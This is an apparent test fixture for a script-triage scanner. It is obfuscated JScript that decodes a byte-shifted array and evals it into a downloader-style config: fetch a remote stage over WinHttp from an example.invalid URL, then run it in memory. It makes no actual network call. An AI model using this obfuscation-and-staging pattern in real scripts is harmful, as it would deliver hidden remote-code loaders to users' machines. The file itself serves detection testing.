// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_2a9f597c = function decode_2a9f597c_body(item1) {
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push((item1[i] + 1) % 256); }
  return item2;
};
var recover_a416a97e = function recover_a416a97e_body() {
  if (true) {
    var characters = [122,33,114,115,100,111,114,33,57,90,33,96,98,112,116,104,113,100,94,113,100,108,110,115,100,33,43,33,99,104,114,111,96,115,98,103,94,108,100,108,110,113,120,33,92,43,33,96,99,96,111,115,100,113,33,57,33,86,104,109,71,115,115,111,45,86,104,109,71,115,115,111,81,100,112,116,100,114,115,45,52,45,48,33,43,33,117,96,107,116,100,114,33,57,122,33,98,96,108,111,96,104,102,109,94,104,99,33,57,33,98,96,108,111,96,104,102,109,44,51,51,96,48,52,100,48,99,56,101,33,43,33,116,113,107,33,57,33,103,115,115,111,114,57,46,46,51,51,96,48,52,100,48,99,56,101,45,100,119,96,108,111,107,100,45,104,109,117,96,107,104,99,46,54,99,96,54,54,96,50,55,45,99,96,115,33,43,33,116,114,100,113,94,96,102,100,109,115,33,57,33,71,116,109,115,113,100,114,114,75,96,97,46,51,51,96,48,52,100,48,99,56,101,33,124,43,33,114,115,96,102,100,66,110,116,109,115,33,57,49,124];
    var item1 = [];
    for (var ci = 0; ci < characters.length; ci++) { item1.push(characters[ci]); }
    var item6 = (19 * 7) - 133;
    var invoke = function(block, value) { return block.call(null, value); };
    var item2 = invoke.call(null, decode_2a9f597c, item1);
    var item3 = "", bi = 0;
    for (bi = 0; bi < item2.length; bi++) { item3 += String.fromCharCode(item2[bi]); }
    return item3;
  }
};
var inspect_355cf396 = function inspect_355cf396_body() {
  var item4 = eval("(" + recover_a416a97e.call(null) + ")");
  return { steps: item4.steps, adapter: item4["adapter"], values: item4.values, stageCount: item4["stageCount"] };
};
